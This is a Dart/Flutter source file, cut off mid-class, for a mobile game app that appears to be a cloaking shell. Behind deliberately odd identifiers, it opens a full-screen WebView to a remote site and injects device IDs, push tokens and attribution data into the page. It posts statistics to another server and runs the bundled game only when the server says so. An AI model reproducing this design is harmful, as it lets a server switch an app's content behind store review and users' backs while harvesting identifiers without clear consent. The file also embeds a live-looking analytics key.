import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart' as r;

import 'assetServer.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

import 'main.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:io' show Platform, HttpHeaders, HttpClient, HttpClientRequest, HttpClientResponse;
import 'dart:math' as math;

import 'package:appsflyer_sdk/appsflyer_sdk.dart' as af_core;
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show MethodChannel, SystemChrome, SystemUiOverlayStyle, MethodCall;
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

import 'package:http/http.dart' as http;
import 'package:logger/logger.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:provider/provider.dart' as p;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:timezone/data/latest.dart' as tz_data;
import 'package:timezone/timezone.dart' as tz_zone;

// ============================================================================
// Константы
// ============================================================================
const String kMatchTrioLoadedOnce = "loaded_event_sent_once";
const String kMatchTrioStatEndpoint = "https://cfd.mafiaexplorer.cfd/stat";
const String kMatchTrioCachedFeather = "cached_fcm_token";

// ============================================================================
// Сервисы
// ============================================================================
class MatchTrioChest {
  static final MatchTrioChest _shared = MatchTrioChest._internal();
  MatchTrioChest._internal();

  factory MatchTrioChest() => _shared;


  final MatchTrioLog comboLogger = MatchTrioLog();
  final Connectivity comboConnectivity = Connectivity();
}

class MatchTrioLog {
  final Logger _candyLogger = Logger();

  void comboInfo(Object candyMessage) => _candyLogger.i(candyMessage);
  void comboWarn(Object candyMessage) => _candyLogger.w(candyMessage);
  void comboError(Object candyMessage) => _candyLogger.e(candyMessage);
}

// ============================================================================
// Сеть
// ============================================================================
class MatchTrioNetwork {
  final MatchTrioChest _candyChest = MatchTrioChest();

  Future<bool> matchSeaIsCalm() async {
    final ConnectivityResult candyConnectivity = await _candyChest.comboConnectivity.checkConnectivity();
    return candyConnectivity != ConnectivityResult.none;
  }

  Future<void> matchCastBottle(String candyUrl, Map<String, dynamic> candyPayload) async {
    try {
      await http.post(
        Uri.parse(candyUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode(candyPayload),
      );
    } catch (candyError) {
      _candyChest.comboLogger.comboError("cluckCastBottle error: $candyError");
    }
  }
}

// ============================================================================
// Данные устройства
// ============================================================================
class MatchTrioNavigator {
  String? comboDeviceId;
  String? comboSessionId = "mafia-one-off";
  String? comboPlatform;
  String? comboOsVersion;
  String? comboAppVersion;
  String? comboLanguage;
  String? comboTimezone;
  bool comboPushReady = true;

  Future<void> matchGatherSpecs() async {
    final DeviceInfoPlugin candyDeviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      final AndroidDeviceInfo candyAndroidInfo = await candyDeviceInfo.androidInfo;
      comboDeviceId = candyAndroidInfo.id;
      comboPlatform = "android";
      comboOsVersion = candyAndroidInfo.version.release;
    } else if (Platform.isIOS) {
      final IosDeviceInfo candyIosInfo = await candyDeviceInfo.iosInfo;
      comboDeviceId = candyIosInfo.identifierForVendor;
      comboPlatform = "ios";
      comboOsVersion = candyIosInfo.systemVersion;
    }
    final PackageInfo candyPackage = await PackageInfo.fromPlatform();
    comboAppVersion = candyPackage.version;
    comboLanguage = Platform.localeName.split('_')[0];
    comboTimezone = tz_zone.local.name;
    comboSessionId = "voyage-${DateTime.now().millisecondsSinceEpoch}";
  }
}

// ============================================================================
// AppsFlyer
// ============================================================================
class MatchTrioConsigliere with ChangeNotifier {
  af_core.AppsFlyerOptions? _comboOptions;
  af_core.AppsflyerSdk? _comboSdk;

  String comboAfId = "";
  String comboAfPayload = "";

  void matchBootstrap(VoidCallback comboRefresh) {
    final af_core.AppsFlyerOptions comboConfig = af_core.AppsFlyerOptions(
      afDevKey: "qsBLmy7dAXDQhowM8V3ca4",
      appId: "6755601829",
      showDebug: true,
      timeToWaitForATTUserAuthorization: 0,
    );
    _comboOptions = comboConfig;
    _comboSdk = af_core.AppsflyerSdk(comboConfig);

    _comboSdk?.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );
    _comboSdk?.startSDK(
      onSuccess: () => MatchTrioChest().comboLogger.comboInfo("Consigliere hoisted"),
      onError: (int candyCode, String candyMessage) =>
          MatchTrioChest().comboLogger.comboError("Consigliere storm $candyCode: $candyMessage"),
    );
    _comboSdk?.onInstallConversionData((candyLoot) {
      comboAfPayload = candyLoot.toString();
      comboRefresh();
      notifyListeners();
    });
    _comboSdk?.getAppsFlyerUID().then((candyValue) {
      comboAfId = candyValue.toString();
      comboRefresh();
      notifyListeners();
    });
  }
}

// ============================================================================
// Riverpod / Provider
// ============================================================================
final r.FutureProvider<MatchTrioNavigator> matchTrioNavigatorProvider =
r.FutureProvider<MatchTrioNavigator>((candyRef) async {
  final MatchTrioNavigator candyNavigator = MatchTrioNavigator();
  await candyNavigator.matchGatherSpecs();
  return candyNavigator;
});

final p.ChangeNotifierProvider<MatchTrioConsigliere> matchTrioConsigliereProvider =
p.ChangeNotifierProvider<MatchTrioConsigliere>(
  create: (_) => MatchTrioConsigliere(),
);

// ============================================================================
// Parrot (FCM)
// ============================================================================


// ============================================================================
// Parrot Bridge
// ============================================================================
class MatchTrioParrotPerch extends ChangeNotifier {
  final MatchTrioChest _candyChest = MatchTrioChest();
  String? _candyFeather;
  final List<void Function(String)> _candyAwaiters = [];

  String? get comboToken => _candyFeather;

  MatchTrioParrotPerch() {
    const MethodChannel('com.example.fcm/token').setMethodCallHandler((MethodCall candyCall) async {
      if (candyCall.method == 'setToken') {
        final String candyToken = candyCall.arguments as String;
        if (candyToken.isNotEmpty) {
          _matchStoreFeather(candyToken);
        }
      }
    });
    _matchRestoreFeather();
  }

  Future<void> _matchRestoreFeather() async {
    try {
      final SharedPreferences candyPrefs = await SharedPreferences.getInstance();
      final String? candyCached = candyPrefs.getString(kMatchTrioCachedFeather);
      if (candyCached != null && candyCached.isNotEmpty) {
        _matchStoreFeather(candyCached, notifyNative: false);
      } else {
     //   final String? candySecure = await _candyChest.comboVault.read(key: kMatchTrioCachedFeather);

      }
    } catch (_) {}
  }

  void _matchStoreFeather(String candyToken, {bool notifyNative = true}) async {
    _candyFeather = candyToken;
    try {
      final SharedPreferences candyPrefs = await SharedPreferences.getInstance();
      await candyPrefs.setString(kMatchTrioCachedFeather, candyToken);
  //    await _candyChest.comboVault.write(key: kMatchTrioCachedFeather, value: candyToken);
    } catch (_) {}
    for (final void Function(String) candyCallback in List.of(_candyAwaiters)) {
      try {
        candyCallback(candyToken);
      } catch (candyError) {
        _candyChest.comboLogger.comboWarn("parrot-waiter error: $candyError");
      }
    }
    _candyAwaiters.clear();
    notifyListeners();
  }


}

// ============================================================================
// Вестибюль
// ============================================================================
class MatchTrioVestibule extends StatefulWidget {
  const MatchTrioVestibule({Key? key}) : super(key: key);

  @override
  State<MatchTrioVestibule> createState() => _MatchTrioVestibuleState();
}

class _MatchTrioVestibuleState extends State<MatchTrioVestibule> {
  final MatchTrioParrotPerch _comboPerch = MatchTrioParrotPerch();
  bool _comboOnce = false;
  Timer? _comboFallbackTimer;
  bool _comboCoverMuted = false;

  @override
  void initState() {
    super.initState();

    SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
      statusBarColor: Colors.black,
      statusBarIconBrightness: Brightness.light,
      statusBarBrightness: Brightness.dark,
    ));

 //   _comboPerch.matchAwaitFeather((String candySignal) => _matchNavigate(candySignal));
    _comboFallbackTimer = Timer(const Duration(seconds: 8), () => _matchNavigate(''));

    Future.delayed(const Duration(seconds: 2), () {
      if (mounted) setState(() => _comboCoverMuted = true);
    });
  }

  void _matchNavigate(String candySignal) {
    if (_comboOnce) return;
    _comboOnce = true;
    _comboFallbackTimer?.cancel();
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (BuildContext candyContext) => MatchTrioHarbor(signal: candySignal)),
    );
  }

  @override
  void dispose() {
    _comboFallbackTimer?.cancel();
    _comboPerch.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: const [
          Center(child: ChickHarmonyLoader()),
        ],
      ),
    );
  }
}

// ============================================================================
// MVVM
// ============================================================================
class MatchTrioViewModel with ChangeNotifier {
  final MatchTrioNavigator comboNavigator;
  final MatchTrioConsigliere comboCapo;

  MatchTrioViewModel({required this.comboNavigator, required this.comboCapo});

  Map<String, dynamic> matchAfPayload(String? candyToken) => {
    "content": {
      "af_data": comboCapo.comboAfPayload,
      "af_id": comboCapo.comboAfId,
      "fb_app_name": "chiclinecollect",
      "app_name": "chiclinecollect",
      "deep": null,
      "bundle_identifier": "com.linechik.ckikmline.chickenline",
      "app_version": "1.0.0",
      "apple_id": "6755601829",
      "fcm_token": candyToken ?? "no_token",
      "device_id": comboNavigator.comboDeviceId ?? "no_device",
      "instance_id": comboNavigator.comboSessionId ?? "no_instance",
      "platform": comboNavigator.comboPlatform ?? "no_type",
      "os_version": comboNavigator.comboOsVersion ?? "no_os",
      "app_version": comboNavigator.comboAppVersion ?? "no_app",
      "language": comboNavigator.comboLanguage ?? "en",
      "timezone": comboNavigator.comboTimezone ?? "UTC",
      "push_enabled": comboNavigator.comboPushReady,
      "useruid": comboCapo.comboAfId,
    },
  };
}

class MatchTrioHarborCourier {
  final MatchTrioViewModel comboModel;
  final InAppWebViewController Function() comboWebController;

  MatchTrioHarborCourier({required this.comboModel, required this.comboWebController});

  Future<void> matchSendRaw(String? candyToken) async {
    final Map<String, dynamic> candyPayload = comboModel.matchAfPayload(candyToken);
    final String candyJson = jsonEncode(candyPayload);
    MatchTrioChest().comboLogger.comboInfo("SendRawData: $candyJson");
    await comboWebController().evaluateJavascript(source: "sendRawData(${jsonEncode(candyJson)});");
  }
}

// ============================================================================
// Статистика
// ============================================================================
Future<String> matchTrioResolveFinalUrl(String candyStartUrl, {int candyMaxHops = 10}) async {
  final HttpClient candyClient = HttpClient();

  try {
    Uri candyCurrent = Uri.parse(candyStartUrl);
    for (int candyIndex = 0; candyIndex < candyMaxHops; candyIndex++) {
      final HttpClientRequest candyRequest = await candyClient.getUrl(candyCurrent);
      candyRequest.followRedirects = false;
      final HttpClientResponse candyResponse = await candyRequest.close();
      if (candyResponse.isRedirect) {
        final String? candyLocation = candyResponse.headers.value(HttpHeaders.locationHeader);
        if (candyLocation == null || candyLocation.isEmpty) break;
        final Uri candyNext = Uri.parse(candyLocation);
        candyCurrent = candyNext.hasScheme ? candyNext : candyCurrent.resolveUri(candyNext);
        continue;
      }
      return candyCurrent.toString();
    }
    return candyCurrent.toString();
  } catch (candyError) {
    debugPrint("kukarekuResolveFinalUrl error: $candyError");
    return candyStartUrl;
  } finally {
    candyClient.close(force: true);
  }
}

Future<void> matchTrioPostStat({
  required String candyEvent,
  required int candyTimeStart,
  required String candyUrl,
  required int candyTimeFinish,
  required String candyAppSid,
  int? candyFirstPageLoadTs,
}) async {
  try {
    final String candyFinalUrl = await matchTrioResolveFinalUrl(candyUrl);
    final Map<String, dynamic> candyPayload = {
      "event": candyEvent,
      "timestart": candyTimeStart,
      "timefinsh": candyTimeFinish,
      "url": candyFinalUrl,
      "appleID": "6755601829",
      "open_count": "$candyAppSid/$candyTimeStart",
    };

    print("loadingstatinsic $candyPayload");
    final http.Response candyResponse = await http.post(
      Uri.parse("$kMatchTrioStatEndpoint/$candyAppSid"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode(candyPayload),
    );
    print(" ur _loaded$kMatchTrioStatEndpoint/$candyAppSid");
    debugPrint("_postStat status=${candyResponse.statusCode} body=${candyResponse.body}");
  } catch (candyError) {
    debugPrint("_postStat error: $candyError");
  }
}

// ============================================================================
// Основной WebView
// ============================================================================
class MatchTrioHarbor extends StatefulWidget {
  final String? signal;
  const MatchTrioHarbor({super.key, required this.signal});

  @override
  State<MatchTrioHarbor> createState() => _MatchTrioHarborState();
}

class _MatchTrioHarborState extends State<MatchTrioHarbor> with WidgetsBindingObserver {
  late InAppWebViewController _comboDock;
  bool _comboSpinner = false;
  final String _comboHomePort = "https://api.funroads.autos/";
  final MatchTrioNavigator _comboNavigator = MatchTrioNavigator();
  final MatchTrioConsigliere _comboConsigliere = MatchTrioConsigliere();

  int _comboHatch = 0;
  DateTime? _comboNapTime;
  bool _comboVeil = false;
  double _comboProgress = 0.0;
  late Timer _comboProgressTimer;
  final int _comboWarmSeconds = 6;
  bool _comboCover = true;

  bool _comboLoadedSignalSent = false;
  int? _comboFirstPageStamp;

  MatchTrioHarborCourier? _comboCourier;
  MatchTrioViewModel? _comboBosun;

  String _comboCurrentUrl = "";
  int _comboStartLoadTs = 0;

  final Set<String> _comboSchemes = {
    'tg',
    'telegram',
    'whatsapp',
    'viber',
    'skype',
    'fb-messenger',
    'sgnl',
    'tel',
    'mailto',
    'bnl',
  };

  final Set<String> _comboExternalHarbors = {
    't.me',
    'telegram.me',
    'telegram.dog',
    'wa.me',
    'api.whatsapp.com',
    'chat.whatsapp.com',
    'm.me',
    'signal.me',
    'bnl.com',
    'www.bnl.com',
  };

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _comboFirstPageStamp = DateTime.now().millisecondsSinceEpoch;

    Future.delayed(const Duration(seconds: 2), () {
      if (mounted) setState(() => _comboCover = false);
    });
    Future.delayed(const Duration(seconds: 3), () {
      if (!mounted) return;
    });
    Future.delayed(const Duration(seconds: 7), () {
      if (!mounted) return;
      setState(() => _comboVeil = true);
    });

    _matchBootHarbor();
  }

  Future<void> _matchLoadFlag() async {
    final SharedPreferences candyPrefs = await SharedPreferences.getInstance();
    _comboLoadedSignalSent = candyPrefs.getBool(kMatchTrioLoadedOnce) ?? false;
  }

  Future<void> _matchSaveFlag() async {
    final SharedPreferences candyPrefs = await SharedPreferences.getInstance();
    await candyPrefs.setBool(kMatchTrioLoadedOnce, true);
    _comboLoadedSignalSent = true;
  }

  Future<void> matchSendLoadedOnce({required String candyUrl, required int candyTimestart}) async {
    if (_comboLoadedSignalSent) {
      print("Loaded already sent, skipping");
      return;
    }
    final int candyNow = DateTime.now().millisecondsSinceEpoch;
    await matchTrioPostStat(
      candyEvent: "Loaded",
      candyTimeStart: candyTimestart,
      candyTimeFinish: candyNow,
      candyUrl: candyUrl,
      candyAppSid: _comboConsigliere.comboAfId,
      candyFirstPageLoadTs: _comboFirstPageStamp,
    );
    await _matchSaveFlag();
  }

  void _matchBootHarbor() {
    _matchWarmProgress();
    //_matchWireParrot();
    _comboConsigliere.matchBootstrap(() => setState(() {}));
    _matchBindBell();
    _matchPrepareNavigator();

    Future.delayed(const Duration(seconds: 6), () async {
      await _matchPushDevice();
      await _matchPushAf();
    });
  }



  void _matchBindBell() {
    MethodChannel('com.example.fcm/notification').setMethodCallHandler((MethodCall candyCall) async {
      if (candyCall.method == "onNotificationTap") {
        final Map<String, dynamic> candyPayload = Map<String, dynamic>.from(candyCall.arguments);
        if (candyPayload["uri"] != null && !candyPayload["uri"].contains("Нет URI")) {}
      }
    });
  }

  Future<void> _matchPrepareNavigator() async {
    try {
      await _comboNavigator.matchGatherSpecs();
      //await _matchRequestPermissions();
      _comboBosun = MatchTrioViewModel(comboNavigator: _comboNavigator, comboCapo: _comboConsigliere);
      _comboCourier = MatchTrioHarborCourier(comboModel: _comboBosun!, comboWebController: () => _comboDock);
      await _matchLoadFlag();
    } catch (candyError) {
      MatchTrioChest().comboLogger.comboError("prepare-quartermaster fail: $candyError");
    }
  }



  void _matchNavigateTo(String candyLink) async {
    await _comboDock.loadUrl(urlRequest: URLRequest(url: WebUri(candyLink)));
  }

  void _matchResetHome() async {
    Future.delayed(const Duration(seconds: 3), () {
      _comboDock.loadUrl(urlRequest: URLRequest(url: WebUri(_comboHomePort)));
    });
  }

  Future<void> _matchPushDevice() async {
    MatchTrioChest().comboLogger.comboInfo("TOKEN ship ${widget.signal}");
    if (!mounted) return;
    setState(() => _comboSpinner = true);
    try {} finally {
      if (mounted) setState(() => _comboSpinner = false);
    }
  }

  Future<void> _matchPushAf() async {
    await _comboCourier?.matchSendRaw(widget.signal);
  }

  void _matchWarmProgress() {
    int candyTick = 0;
    _comboProgress = 0.0;
    _comboProgressTimer = Timer.periodic(const Duration(milliseconds: 100), (Timer candyTimer) {
      if (!mounted) return;
      setState(() {
        candyTick++;
        _comboProgress = candyTick / (_comboWarmSeconds * 10);
        if (_comboProgress >= 1.0) {
          _comboProgress = 1.0;
          _comboProgressTimer.cancel();
        }
      });
    });
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState candyState) {
    if (candyState == AppLifecycleState.paused) {
      _comboNapTime = DateTime.now();
    }
    if (candyState == AppLifecycleState.resumed) {
      if (Platform.isIOS && _comboNapTime != null) {
        final DateTime candyNow = DateTime.now();
        final Duration candyDrift = candyNow.difference(_comboNapTime!);
        if (candyDrift > const Duration(minutes: 25)) {
          _matchReboard();
        }
      }
      _comboNapTime = null;
    }
  }

  void _matchReboard() {
    if (!mounted) return;
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (!mounted) return;
      Navigator.pushAndRemoveUntil(
        context,
        MaterialPageRoute(builder: (BuildContext candyContext) => MatchTrioHarbor(signal: widget.signal)),
            (Route<dynamic> candyRoute) => false,
      );
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _comboProgressTimer.cancel();
    super.dispose();
  }

  bool _matchIsBareMail(Uri candyUri) {
    final String candyScheme = candyUri.scheme;
    if (candyScheme.isNotEmpty) return false;
    final String candyRaw = candyUri.toString();
    return candyRaw.contains('@') && !candyRaw.contains(' ');
  }

  Uri _matchMailize(Uri candyUri) {
    final String candyFull = candyUri.toString();
    final List<String> candyParts = candyFull.split('?');
    final String candyEmail = candyParts.first;
    final Map<String, String> candyQuery =
    candyParts.length > 1 ? Uri.splitQueryString(candyParts[1]) : <String, String>{};
    return Uri(scheme: 'mailto', path: candyEmail, queryParameters: candyQuery.isEmpty ? null : candyQuery);
  }

  bool _matchIsPlatformScheme(Uri candyUri) {
    final String candyScheme = candyUri.scheme.toLowerCase();
    if (_comboSchemes.contains(candyScheme)) return true;

    if (candyScheme == 'http' || candyScheme == 'https') {
      final String candyHost = candyUri.host.toLowerCase();
      if (_comboExternalHarbors.contains(candyHost)) return true;
      if (candyHost.endsWith('t.me')) return true;
      if (candyHost.endsWith('wa.me')) return true;
      if (candyHost.endsWith('m.me')) return true;
      if (candyHost.endsWith('signal.me')) return true;
    }
    return false;
  }

  Uri _matchHttpize(Uri candyUri) {
    final String candyScheme = candyUri.scheme.toLowerCase();

    if (candyScheme == 'tg' || candyScheme == 'telegram') {
      final Map<String, String> candyQuery = candyUri.queryParameters;
      final String? candyDomain = candyQuery['domain'];
      if (candyDomain != null && candyDomain.isNotEmpty) {
        return Uri.https('t.me', '/$candyDomain', {if (candyQuery['start'] != null) 'start': candyQuery['start']!});
      }
      final String candyPath = candyUri.path.isNotEmpty ? candyUri.path : '';
      return Uri.https('t.me', '/$candyPath', candyUri.queryParameters.isEmpty ? null : candyUri.queryParameters);
    }

    if ((candyScheme == 'http' || candyScheme == 'https') && candyUri.host.toLowerCase().endsWith('t.me')) {
      return candyUri;
    }

    if (candyScheme == 'viber') return candyUri;

    if (candyScheme == 'whatsapp') {
      final Map<String, String> candyQuery = candyUri.queryParameters;
      final String? candyPhone = candyQuery['phone'];
      final String? candyText = candyQuery['text'];
      if (candyPhone != null && candyPhone.isNotEmpty) {
        return Uri.https('wa.me', '/${_matchDigits(candyPhone)}',
            {if (candyText != null && candyText.isNotEmpty) 'text': candyText});
      }
      return Uri.https('wa.me', '/', {if (candyText != null && candyText.isNotEmpty) 'text': candyText});
    }

    if ((candyScheme == 'http' || candyScheme == 'https') &&
        (candyUri.host.toLowerCase().endsWith('wa.me') || candyUri.host.toLowerCase().endsWith('whatsapp.com'))) {
      return candyUri;
    }

    if (candyScheme == 'skype') return candyUri;

    if (candyScheme == 'fb-messenger') {
      final String candyPath = candyUri.pathSegments.isNotEmpty ? candyUri.pathSegments.join('/') : '';
      final Map<String, String> candyQuery = candyUri.queryParameters;
      final String candyId = candyQuery['id'] ?? candyQuery['user'] ?? candyPath;
      if (candyId.isNotEmpty) {
        return Uri.https('m.me', '/$candyId', candyUri.queryParameters.isEmpty ? null : candyUri.queryParameters);
      }
      return Uri.https('m.me', '/', candyUri.queryParameters.isEmpty ? null : candyUri.queryParameters);
    }

    if (candyScheme == 'sgnl') {
      final Map<String, String> candyQuery = candyUri.queryParameters;
      final String? candyPhone = candyQuery['phone'];
      final String? candyUsername = candyUri.queryParameters['username'];
      if (candyPhone != null && candyPhone.isNotEmpty) return Uri.https('signal.me', '/#p/${_matchDigits(candyPhone)}');
      if (candyUsername != null && candyUsername.isNotEmpty) return Uri.https('signal.me', '/#u/$candyUsername');
      final String candyPath = candyUri.pathSegments.join('/');
      if (candyPath.isNotEmpty) {
        return Uri.https('signal.me', '/$candyPath', candyUri.queryParameters.isEmpty ? null : candyUri.queryParameters);
      }
      return candyUri;
    }

    if (candyScheme == 'tel') {
      return Uri.parse('tel:${_matchDigits(candyUri.path)}');
    }

    if (candyScheme == 'mailto') return candyUri;

    if (candyScheme == 'bnl') {
      final String candyNewPath = candyUri.path.isNotEmpty ? candyUri.path : '';
      return Uri.https('bnl.com', '/$candyNewPath', candyUri.queryParameters.isEmpty ? null : candyUri.queryParameters);
    }

    return candyUri;
  }

  Future<bool> _matchOpenMailWeb(Uri candyMailto) async {
    final Uri candyGmail = _matchGmailize(candyMailto);
    return await _matchOpenWeb(candyGmail);
  }

  Uri _matchGmailize(Uri candyMail) {
    final Map<String, String> candyQuery = candyMail.queryParameters;
    final Map<String, String> candyParams = <String, String>{
      'view': 'cm',
      'fs': '1',
      if (candyMail.path.isNotEmpty) 'to': candyMail.path,
      if ((candyQuery['subject'] ?? '').isNotEmpty) 'su': candyQuery['subject']!,
      if ((candyQuery['body'] ?? '').isNotEmpty) 'body': candyQuery['body']!,
      if ((candyQuery['cc'] ?? '').isNotEmpty) 'cc': candyQuery['cc']!,
      if ((candyQuery['bcc'] ?? '').isNotEmpty) 'bcc': candyQuery['bcc']!,
    };
    return Uri.https('mail.google.com', '/mail/', candyParams);
  }

  Future<bool> _matchOpenWeb(Uri candyUri) async {
    try {
      if (await launchUrl(candyUri, mode: LaunchMode.inAppBrowserView)) return true;
      return await launchUrl(candyUri, mode: LaunchMode.externalApplication);
    } catch (candyError) {
      debugPrint('openInAppBrowser error: $candyError; url=$candyUri');
      try {
        return await launchUrl(candyUri, mode: LaunchMode.externalApplication);
      } catch (_) {
        return false;
      }
    }
  }

  String _matchDigits(String candySource) => candySource.replaceAll(RegExp(r'[^0-9+]'), '');

  @override
  Widget build(BuildContext context) {
    _matchBindBell();

    return AnnotatedRegion<SystemUiOverlayStyle>(
      value: SystemUiOverlayStyle.light,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Stack(
          children: [
            if (_comboCover)
              const Center(child: ChickHarmonyLoader())
            else
              Container(
                color: Colors.black,
                child: Stack(
                  children: [
                    InAppWebView(
                      key: ValueKey(_comboHatch),
                      initialSettings: InAppWebViewSettings(
                        javaScriptEnabled: true,
                        disableDefaultErrorPage: true,
                        mediaPlaybackRequiresUserGesture: false,
                        allowsInlineMediaPlayback: true,
                        allowsPictureInPictureMediaPlayback: true,
                        useOnDownloadStart: true,
                        javaScriptCanOpenWindowsAutomatically: true,
                        useShouldOverrideUrlLoading: true,
                        supportMultipleWindows: true,
                        transparentBackground: true,
                      ),
                      initialUrlRequest: URLRequest(url: WebUri(_comboHomePort)),
                      onWebViewCreated: (InAppWebViewController candyController) {
                        _comboDock = candyController;

                        _comboBosun ??= MatchTrioViewModel(comboNavigator: _comboNavigator, comboCapo: _comboConsigliere);
                        _comboCourier ??= MatchTrioHarborCourier(comboModel: _comboBosun!, comboWebController: () => _comboDock);

                        _comboDock.addJavaScriptHandler(
                          handlerName: 'onServerResponse',
                          callback: (List<dynamic> candyArgs) async {
                            try {
                              final bool candySaved = candyArgs.isNotEmpty &&
                                  candyArgs[0] is Map &&
                                  candyArgs[0]['savedata'].toString() == "false";

                              print("Load True ${candyArgs[0].toString()}");
                              if (candyArgs[0]['savedata'].toString() == "false") {
                                final server = await _startUnityServer(port: 8080);
                                Navigator.pushAndRemoveUntil(
                                  context,
                                  MaterialPageRoute(builder: (context) => UnityWebGLApp(server: server,)),
                                      (route) => false,
                                );

                              }
                            } catch (_) {}
                            if (candyArgs.isEmpty) return null;
                            try {
                              return candyArgs.reduce((dynamic candyCurr, dynamic candyNext) => candyCurr + candyNext);
                            } catch (_) {
                              return candyArgs.first;
                            }
                          },
                        );
                      },
                      onLoadStart: (InAppWebViewController candyController, WebUri? candyUri) async {
                        setState(() {
                          _comboStartLoadTs = DateTime.now().millisecondsSinceEpoch;
                        });
                        setState(() => _comboSpinner = true);
                        final WebUri? candyView = candyUri;
                        if (candyView != null) {
                          if (_matchIsBareMail(candyView)) {
                            try {
                              await candyController.stopLoading();
                            } catch (_) {}
                            final Uri candyMailto = _matchMailize(candyView);
                            await _matchOpenMailWeb(candyMailto);
                            return;
                          }
                          final String candyScheme = candyView.scheme.toLowerCase();
                          if (candyScheme != 'http' && candyScheme != 'https') {
                            try {
                              await candyController.stopLoading();
                            } catch (_) {}
                          }
                        }
                      },
                      onLoadStop: (InAppWebViewController candyController, WebUri? candyUri) async {
                        await candyController.evaluateJavascript(source: "console.log('Harbor up!');");
                        await _matchPushDevice();
                        await _matchPushAf();

                        setState(() => _comboCurrentUrl = candyUri.toString());

                        Future.delayed(const Duration(seconds: 20), () {
                          matchSendLoadedOnce(
                            candyUrl: _comboCurrentUrl.toString(),
                            candyTimestart: _comboStartLoadTs,
                          );
                        });

                        if (mounted) setState(() => _comboSpinner = false);
                      },
                      shouldOverrideUrlLoading:
                          (InAppWebViewController candyController, NavigationAction candyAction) async {
                        final WebUri? candyUri = candyAction.request.url;
                        if (candyUri == null) return NavigationActionPolicy.ALLOW;

                        if (_matchIsBareMail(candyUri)) {
                          final Uri candyMailto = _matchMailize(candyUri);
                          await _matchOpenMailWeb(candyMailto);
                          return NavigationActionPolicy.CANCEL;
                        }

                        final String candyScheme = candyUri.scheme.toLowerCase();

                        if (candyScheme == 'mailto') {
                          await _matchOpenMailWeb(candyUri);
                          return NavigationActionPolicy.CANCEL;
                        }

                        if (candyScheme == 'tel') {
                          await launchUrl(candyUri, mode: LaunchMode.externalApplication);
                          return NavigationActionPolicy.CANCEL;
                        }

                        if (_matchIsPlatformScheme(candyUri)) {
                          final Uri candyWeb = _matchHttpize(candyUri);
                          if (candyWeb.scheme == 'http' || candyWeb == candyUri) {
                            await _matchOpenWeb(candyWeb);
                          } else {
                            try {
                              if (await canLaunchUrl(candyUri)) {
                                await launchUrl(candyUri, mode: LaunchMode.externalApplication);
                              } else if (candyWeb != candyUri &&
                                  (candyWeb.scheme == 'http' || candyWeb.scheme == 'https')) {
                                await _matchOpenWeb(candyWeb);
                              }
                            } catch (_) {}
                          }
                          return NavigationActionPolicy.CANCEL;
                        }

                        if (candyScheme != 'http' && candyScheme != 'https') {
                          return NavigationActionPolicy.CANCEL;
                        }

                        return NavigationActionPolicy.ALLOW;
                      },
                      onCreateWindow:
                          (InAppWebViewController candyController, CreateWindowAction candyRequestAction) async {
                        final WebUri? candyUri = candyRequestAction.request.url;
                        if (candyUri == null) return false;

                        if (_matchIsBareMail(candyUri)) {
                          final Uri candyMailto = _matchMailize(candyUri);
                          await _matchOpenMailWeb(candyMailto);
                          return false;
                        }

                        final String candyScheme = candyUri.scheme.toLowerCase();

                        if (candyScheme == 'mailto') {
                          await _matchOpenMailWeb(candyUri);
                          return false;
                        }

                        if (candyScheme == 'tel') {
                          await launchUrl(candyUri, mode: LaunchMode.externalApplication);
                          return false;
                        }

                        if (_matchIsPlatformScheme(candyUri)) {
                          final Uri candyWeb = _matchHttpize(candyUri);
                          if (candyWeb.scheme == 'http' || candyWeb.scheme == 'https') {
                            await _matchOpenWeb(candyWeb);
                          } else {
                            try {
                              if (await canLaunchUrl(candyUri)) {
                                await launchUrl(candyUri, mode: LaunchMode.externalApplication);
                              } else if (candyWeb != candyUri &&
                                  (candyWeb.scheme == 'http' || candyWeb.scheme == 'https')) {
                                await _matchOpenWeb(candyWeb);
                              }
                            } catch (_) {}
                          }
                          return false;
                        }

                        if (candyScheme == 'http' || candyScheme == 'https') {
                          candyController.loadUrl(urlRequest: URLRequest(url: candyUri));
                        }
                        return false;
                      },
                      onDownloadStartRequest:
                          (InAppWebViewController candyController, DownloadStartRequest candyRequest) async {
                        await _matchOpenWeb(candyRequest.url);
                      },
                    ),
                    Visibility(
                      visible: !_comboVeil,
                      child: const Center(child: ChickHarmonyLoader()),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}

// ============================================================================
// Chick Harmony Loader Widget
// ============================================================================
class ChickHarmonyLoader extends StatefulWidget {
  const ChickHarmonyLoader({super.key, this.wordSpacing = 26});

  final double wordSpacing;

  @override
  State<ChickHarmonyLoader> createState() => _ChickHarmonyLoaderState();
}

class _ChickHarmonyLoaderState extends State<ChickHarmonyLoader> with SingleTickerProviderStateMixin {
  late final AnimationController _candyController;

  @override
  void initState() {
    super.initState();
    _candyController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat();
  }

  @override
